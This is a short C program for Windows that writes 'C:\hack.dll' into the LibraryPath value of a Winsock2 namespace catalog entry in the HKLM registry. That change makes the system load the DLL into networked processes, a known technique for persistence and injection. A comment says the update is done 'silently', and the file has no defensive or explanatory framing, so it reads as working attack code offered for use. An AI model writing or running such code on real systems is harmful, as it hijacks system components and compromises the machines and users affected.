#include <windows.h>
#include <string.h>

int main() {
    HKEY hkey = NULL;
    const char* dll = "C:\\hack.dll";

    // Open the registry key
    LONG res = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "System\\CurrentControlSet\\Services\\WinSock2\\Parameters\\NameSpace_Catalog5\\Catalog_Entries64\\000000000007",
        0,
        KEY_WRITE,
        &hkey
    );

    if (res == ERROR_SUCCESS) {
        // Update the LibraryPath value silently
        RegSetValueExA(
            hkey,
            "LibraryPath",  // Changed from "Image Path" to "LibraryPath"
            0,
            REG_SZ,
            (const BYTE*)dll,
            strlen(dll) + 1
        );
        RegCloseKey(hkey);
    }

    return 0;
}
